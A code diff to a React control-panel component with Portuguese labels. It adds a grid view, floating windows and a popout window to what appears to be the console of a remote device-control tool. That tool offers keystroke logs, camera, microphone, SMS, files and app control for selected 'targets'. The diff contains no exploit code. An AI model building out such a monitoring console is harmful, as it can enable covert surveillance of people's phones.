@@ -1,7 +1,11 @@
 import { useEffect, useMemo, useState } from "react";
 import {
+  ChevronLeft,
+  ChevronRight,
   CircleDot,
   Download,
+  ExternalLink,
+  Layers,
   MonitorSmartphone,
   Plus,
   Radio,
@@ -22,6 +26,8 @@ import { PermissionsView } from "./views/PermissionsView";
 import { FilesView } from "./views/FilesView";
 import { AppsListView } from "./views/AppsListView";
 import { MediaView } from "./views/MediaView";
+import { FloatingDeviceWindow } from "./FloatingDeviceWindow";
+import { MultiDeviceGrid } from "./MultiDeviceGrid";
 
 function formatLastSeen(iso?: string): string {
   if (!iso) return "agora";
@@ -92,10 +98,56 @@ export function ControlPanel() {
   const [activeTool, setActiveTool] = useState<ControlTool>("tela");
   const [activeAppForScreen, setActiveAppForScreen] = useState<InstalledAppItem | null>(null);
   const [toastMsg, setToastMsg] = useState<string | null>(null);
+  const [focusMode, setFocusMode] = useState(false);
+  const [gridCount, setGridCount] = useState<1 | 2 | 3 | 4>(1);
+  const [floatingWindows, setFloatingWindows] = useState<
+    { id: string; device: ControlDevice; x: number; y: number; zIndex: number }[]
+  >([]);
 
   const showToast = (msg: string) => {
     setToastMsg(msg);
     setTimeout(() => setToastMsg(null), 3500);
+  };
+
+  const handleOpenFloating = (targetDev?: ControlDevice) => {
+    const dev = targetDev || selectedDevice;
+    if (!dev) return;
+    const newId = `float_${dev.id}_${Date.now()}`;
+    const offset = (floatingWindows.length % 6) * 35;
+    setFloatingWindows((curr) => [
+      ...curr,
+      {
+        id: newId,
+        device: dev,
+        x: Math.max(40, 100 + offset),
+        y: Math.max(40, 70 + offset),
+        zIndex: 1000 + curr.length + 1
+      }
+    ]);
+    showToast(`Instância Flutuante de ${dev.name} iniciada!`);
+  };
+
+  const handleCloseFloating = (id: string) => {
+    setFloatingWindows((curr) => curr.filter((w) => w.id !== id));
+  };
+
+  const handleBringToFront = (id: string) => {
+    setFloatingWindows((curr) => {
+      const highest = Math.max(...curr.map((w) => w.zIndex), 1000);
+      return curr.map((w) => (w.id === id ? { ...w, zIndex: highest + 1 } : w));
+    });
+  };
+
+  const handlePopoutDesktop = (targetDev?: ControlDevice) => {
+    const dev = targetDev || selectedDevice;
+    if (!dev) return;
+    const url = `${window.location.origin}/?popout=true&deviceId=${encodeURIComponent(dev.id)}`;
+    window.open(
+      url,
+      `DVIEW_Popout_${dev.id.replace(/[^a-zA-Z0-9]/g, "_")}`,
+      "width=480,height=880,menubar=no,toolbar=no,status=no,resizable=yes"
+    );
+    showToast(`Janela Desktop de ${dev.name} desencaixada!`);
   };
 
   // Auto-fetch real devices from backend on mount if not loaded
@@ -395,64 +447,209 @@ export function ControlPanel() {
           </div>
         </div>
       ) : (
-        <div className="control-three-cols-wrapper">
-          {/* Col 1: Devices list */}
-          <DeviceSidebar
-            devices={controlDevices}
-            selectedId={selectedDevice?.id || ""}
-            onSelect={(dev) => {
-              setSelectedId(dev.id);
-              setSelectedDeviceId(dev.id);
-            }}
-            onToggleFavorite={handleToggleFavorite}
-            onAddEmulator={handleAddEmulator}
-          />
+        <div style={{ display: "flex", flexDirection: "column", flex: 1, minHeight: 0, overflow: "hidden", position: "relative" }}>
+          {/* Top Tactical Command Ribbon */}
+          <div className="control-ribbon-toolbar">
+            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+              {/* Focus Mode Toggle */}
+              <button
+                type="button"
+                className={`ribbon-btn ${focusMode ? "active" : ""}`}
+                onClick={() => {
+                  setFocusMode(!focusMode);
+                  showToast(focusMode ? "Painéis laterais restaurados" : "Modo Foco Ativado: Espaço 100% expandido!");
+                }}
+                title="Modo Foco: Oculta colunas laterais para maximizar área de visualização dos aparelhos"
+              >
+                {focusMode ? <ChevronRight size={14} /> : <ChevronLeft size={14} />}
+                <span>{focusMode ? "MOSTRAR PAINÉIS" : "MODO FOCO (EXPANDIR)"}</span>
+              </button>
 
-          {/* Col 2: Selected device tools menu */}
-          {selectedDevice && (
-            <DeviceToolMenu
-              device={selectedDevice}
-              activeTool={activeTool}
-              onSelectTool={setActiveTool}
-              onToggleLock={handleToggleLock}
-              onUninstall={handleUninstall}
-              onSelectTarget={handleSelectTarget}
-            />
-          )}
+              <div style={{ width: "1px", height: "18px", background: "#1e293b", margin: "0 4px" }} />
 
-          {/* Col 3: Active tool workspace */}
-          <main className="control-col-workspace">
-            {selectedDevice ? (
-              <>
-                {activeTool === "tela" && (
-                  <ScreenView
-                    device={selectedDevice}
-                    activeApp={activeAppForScreen}
-                    onCloseApp={() => setActiveAppForScreen(null)}
-                    allDevices={controlDevices}
-                    onSelectDevice={(dev) => setSelectedId(dev.id)}
-                  />
-                )}
-                {activeTool === "teclado" && <KeyboardLogView device={selectedDevice} />}
-                {activeTool === "dispositivo" && <DeviceInfoView device={selectedDevice} />}
-                {activeTool === "permissoes" && <PermissionsView device={selectedDevice} />}
-                {activeTool === "arquivos" && <FilesView device={selectedDevice} />}
-                {activeTool === "apps" && (
-                  <AppsListView
-                    device={selectedDevice}
-                    onOpenAppControl={handleOpenAppControl}
-                  />
-                )}
-                {(activeTool === "camera" || activeTool === "mic" || activeTool === "sms") && (
-                  <MediaView device={selectedDevice} subType={activeTool} />
-                )}
-              </>
-            ) : (
-              <div className="control-empty-hint" style={{ margin: "auto" }}>
-                Selecione um dispositivo na lista à esquerda para carregar as ferramentas de controle.
+              {/* Grid Layout Selector */}
+              <div style={{ display: "flex", alignItems: "center", background: "#060911", border: "1px solid #1e293b", borderRadius: "6px", padding: "2px" }}>
+                <button
+                  type="button"
+                  className={`tactical-grid-btn ${gridCount === 1 ? "active" : ""}`}
+                  onClick={() => setGridCount(1)}
+                  style={{
+                    background: gridCount === 1 ? "var(--crimson-neon, #ff1a2a)" : "transparent",
+                    color: gridCount === 1 ? "#fff" : "#94a3b8",
+                    border: "none",
+                    borderRadius: "4px",
+                    padding: "3px 8px",
+                    fontSize: "11px",
+                    fontWeight: 700,
+                    cursor: "pointer"
+                  }}
+                  title="1 Tela (Foco Único)"
+                >
+                  1 Tela
+                </button>
+                <button
+                  type="button"
+                  className={`tactical-grid-btn ${gridCount === 2 ? "active" : ""}`}
+                  onClick={() => setGridCount(2)}
+                  style={{
+                    background: gridCount === 2 ? "var(--crimson-neon, #ff1a2a)" : "transparent",
+                    color: gridCount === 2 ? "#fff" : "#94a3b8",
+                    border: "none",
+                    borderRadius: "4px",
+                    padding: "3px 8px",
+                    fontSize: "11px",
+                    fontWeight: 700,
+                    cursor: "pointer"
+                  }}
+                  title="2 Telas (Lado a Lado 2x1)"
+                >
+                  2 Telas (2x1)
+                </button>
+                <button
+                  type="button"
+                  className={`tactical-grid-btn ${gridCount === 3 ? "active" : ""}`}
+                  onClick={() => setGridCount(3)}
+                  style={{
+                    background: gridCount === 3 ? "var(--crimson-neon, #ff1a2a)" : "transparent",
+                    color: gridCount === 3 ? "#fff" : "#94a3b8",
+                    border: "none",
+                    borderRadius: "4px",
+                    padding: "3px 8px",
+                    fontSize: "11px",
+                    fontWeight: 700,
+                    cursor: "pointer"
+                  }}
+                  title="3 Telas (Tríplice 3x1)"
+                >
+                  3 Telas (3x1)
+                </button>
+                <button
+                  type="button"
+                  className={`tactical-grid-btn ${gridCount === 4 ? "active" : ""}`}
+                  onClick={() => setGridCount(4)}
+                  style={{
+                    background: gridCount === 4 ? "var(--crimson-neon, #ff1a2a)" : "transparent",
+                    color: gridCount === 4 ? "#fff" : "#94a3b8",
+                    border: "none",
+                    borderRadius: "4px",
+                    padding: "3px 8px",
+                    fontSize: "11px",
+                    fontWeight: 700,
+                    cursor: "pointer"
+                  }}
+                  title="4 Telas (Matriz Quad 2x2)"
+                >
+                  4 Telas (2x2)
+                </button>
               </div>
+            </div>
+
+            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+              {/* Open Floating Window */}
+              <button
+                type="button"
+                className="ribbon-btn primary-ribbon"
+                onClick={() => handleOpenFloating()}
+                title="Abrir aparelho atual em uma Janela Flutuante com barra lateral MEmu e pino de fixação"
+              >
+                <Layers size={13} />
+                <span>+ Instância Flutuante (MEmu)</span>
+              </button>
+
+              {/* Popout Desktop */}
+              <button
+                type="button"
+                className="ribbon-btn"
+                onClick={() => handlePopoutDesktop()}
+                title="Desencaixar em Janela Independente do Windows (Popout)"
+                style={{ color: "#38bdf8", borderColor: "rgba(56, 189, 248, 0.4)" }}
+              >
+                <ExternalLink size={13} />
+                <span>Desencaixar Janela Desktop</span>
+              </button>
+            </div>
+          </div>
+
+          <div className={`control-three-cols-wrapper ${focusMode ? "focus-mode" : ""}`}>
+            {/* Col 1: Devices list */}
+            <DeviceSidebar
+              devices={controlDevices}
+              selectedId={selectedDevice?.id || ""}
+              onSelect={(dev) => {
+                setSelectedId(dev.id);
+                setSelectedDeviceId(dev.id);
+              }}
+              onToggleFavorite={handleToggleFavorite}
+              onAddEmulator={handleAddEmulator}
+            />
+
+            {/* Col 2: Selected device tools menu */}
+            {selectedDevice && (
+              <DeviceToolMenu
+                device={selectedDevice}
+                activeTool={activeTool}
+                onSelectTool={setActiveTool}
+                onToggleLock={handleToggleLock}
+                onUninstall={handleUninstall}
+                onSelectTarget={handleSelectTarget}
+              />
             )}
-          </main>
+
+            {/* Col 3: Active tool workspace */}
+            <main className="control-col-workspace">
+              {gridCount > 1 ? (
+                <MultiDeviceGrid
+                  devices={controlDevices}
+                  gridCount={gridCount}
+                  onOpenFloating={handleOpenFloating}
+                  onAddEmulator={handleAddEmulator}
+                  onGridCountChange={setGridCount}
+                />
+              ) : selectedDevice ? (
+                <>
+                  {activeTool === "tela" && (
+                    <ScreenView
+                      device={selectedDevice}
+                      activeApp={activeAppForScreen}
+                      onCloseApp={() => setActiveAppForScreen(null)}
+                      allDevices={controlDevices}
+                      onSelectDevice={(dev) => setSelectedId(dev.id)}
+                    />
+                  )}
+                  {activeTool === "teclado" && <KeyboardLogView device={selectedDevice} />}
+                  {activeTool === "dispositivo" && <DeviceInfoView device={selectedDevice} />}
+                  {activeTool === "permissoes" && <PermissionsView device={selectedDevice} />}
+                  {activeTool === "arquivos" && <FilesView device={selectedDevice} />}
+                  {activeTool === "apps" && (
+                    <AppsListView
+                      device={selectedDevice}
+                      onOpenAppControl={handleOpenAppControl}
+                    />
+                  )}
+                  {(activeTool === "camera" || activeTool === "mic" || activeTool === "sms") && (
+                    <MediaView device={selectedDevice} subType={activeTool} />
+                  )}
+                </>
+              ) : (
+                <div className="control-empty-hint" style={{ margin: "auto" }}>
+                  Selecione um dispositivo na lista à esquerda para carregar as ferramentas de controle.
+                </div>
+              )}
+            </main>
+          </div>
+
+          {/* RENDER ACTIVE FLOATING MEMU WINDOWS */}
+          {floatingWindows.map((inst) => (
+            <FloatingDeviceWindow
+              key={inst.id}
+              device={inst.device}
+              initialX={inst.x}
+              initialY={inst.y}
+              zIndex={inst.zIndex}
+              onClose={() => handleCloseFloating(inst.id)}
+              onBringToFront={() => handleBringToFront(inst.id)}
+            />
+          ))}
         </div>
       )}
     </div>
